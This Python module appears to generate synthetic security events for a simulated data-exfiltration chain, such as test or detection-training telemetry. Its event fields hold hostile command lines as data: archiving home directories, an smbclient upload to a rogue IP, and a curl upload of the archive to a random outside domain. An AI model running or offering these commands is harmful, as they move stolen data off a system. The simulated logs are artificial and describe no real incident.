import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_domain, _rand_hash, _shared_context


def data_staging_exfil_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Data staging with archives, pastebin chunks, DNS tunnels, SMB and HTTP exfil."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "data_staging_archive",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "collection", "sequence": 1},
            "action": "logged",
        },
    )
    evt1["process"] = {"name": random.choice(["7z", "tar"]), "command_line": "7z a /tmp/archive.7z /home/*"}
    evt1["file"] = {
        "path": "/tmp/archive.7z",
        "extension": "7z",
        "size": random.randint(8_000_000, 25_000_000),
        "hash": {"sha256": _rand_hash()},
    }
    evt1["network"]["direction"] = "internal"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(300, 900),
        ctx,
        overrides={
            **shared,
            "category": "pastebin_chunk_exfil",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 2},
            "action": random.choice(["allowed", "blocked"]),
        },
    )
    evt2["http"] = {"method": "POST", "response": {"status_code": random.choice([200, 403])}}
    evt2["url"] = {"full": f"https://pastebin.com/api/api_post.php?c={random.randint(1000,9999)}"}
    evt2["file"] = {"path": "/tmp/archive.7z", "extension": "7z", "size": evt1["file"]["size"]}
    evt2["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(900, 1500),
        ctx,
        overrides={
            **shared,
            "category": "dns_tunnel",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["dns"] = {"question": {"name": f"{_rand_domain()}.data.{_rand_domain()}", "type": "TXT"}}
    evt3["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt3):
        return events

    evt4 = build_base_event(
        start_ts + random.randint(1500, 2400),
        ctx,
        overrides={
            **shared,
            "category": "smb_rogue_transfer",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 4},
            "action": "allowed",
            "direction": "outbound",
        },
    )
    rogue_ip = f"172.16.{random.randint(10,30)}.{random.randint(2,200)}"
    evt4["destination"]["ip"] = rogue_ip
    evt4["process"] = {"name": "smbclient", "command_line": f"smbclient \\\\{rogue_ip}\\share -c \"put /tmp/archive.7z\""}
    evt4["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt4):
        return events

    evt5 = build_base_event(
        start_ts + random.randint(2100, 3000),
        ctx,
        overrides={
            **shared,
            "category": "curl_binary_exfil",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "exfiltration", "sequence": 5},
            "action": random.choice(["blocked", "logged"]),
        },
    )
    evt5["process"] = {
        "name": "curl",
        "command_line": f"curl --data-binary @/tmp/archive.7z https://{_rand_domain()}/upload",
    }
    evt5["network"]["direction"] = "outbound"
    evt5["url"] = {"full": f"https://{_rand_domain()}/upload"}
    _append_and_maybe_stop(events, evt5)

    return events
